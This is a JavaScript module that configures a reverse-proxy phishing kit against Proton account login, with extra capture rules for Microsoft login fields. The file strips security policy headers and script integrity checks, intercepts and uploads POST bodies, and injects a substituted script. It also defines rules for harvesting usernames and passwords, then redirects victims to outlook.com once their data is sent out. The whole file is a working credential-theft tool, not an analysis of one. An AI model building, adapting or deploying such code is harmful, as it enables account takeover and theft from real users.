/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                reg: /integrity=.+?crossorigin/igm, // Google chrome on windows fix
                replacement: 'crossorigin',
             },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

        }
        
        this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }


}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        // this.req.headers['accept-encoding'] = 'plain'
        this.req.headers['frame-src'] = 'blob'
        if (this.req.method === 'POST') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)

            // super.captureBody(clientContext.currentDomain, clientContext)

        }

        if (this.req.url === '/index.de6e9ed4.js') {
            console.log('spam stuf')
            const clientBuff = fs.readFileSync(path.join(__dirname, 'index.fdbd209d.js'))
            this.res.writeHead(200)
            return this.res.end(clientBuff.toString());
            
        }

        if (this.req.url.startsWith('/xapi')) {
            this.req.headers['accept-encoding'] = 'plain'
            console.log('api spoiler')
            const qhost = 'account-api.proton.me'
            this.req.url = this.req.url.split('/xapi')[1]
            return super.superExecuteProxy(qhost, clientContext)
        }


        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url === '/auth0/outlook/owa2') {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
            this.res.writeHead('301', {location: 'https://outlook.com'})
            return super.cleanEnd('PHP-EXEC', clientContext)
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'account.proton.me',
    START_PATH: '/login',
    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.live.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.live.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport